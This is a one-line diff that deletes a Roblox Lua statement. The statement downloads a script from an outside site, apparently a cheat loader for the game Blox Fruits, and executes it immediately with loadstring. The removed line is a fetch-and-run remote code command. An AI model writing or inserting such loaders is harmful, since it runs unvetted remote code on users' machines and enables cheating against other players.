@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://reaperking.xyz/bloxfruit", true))()
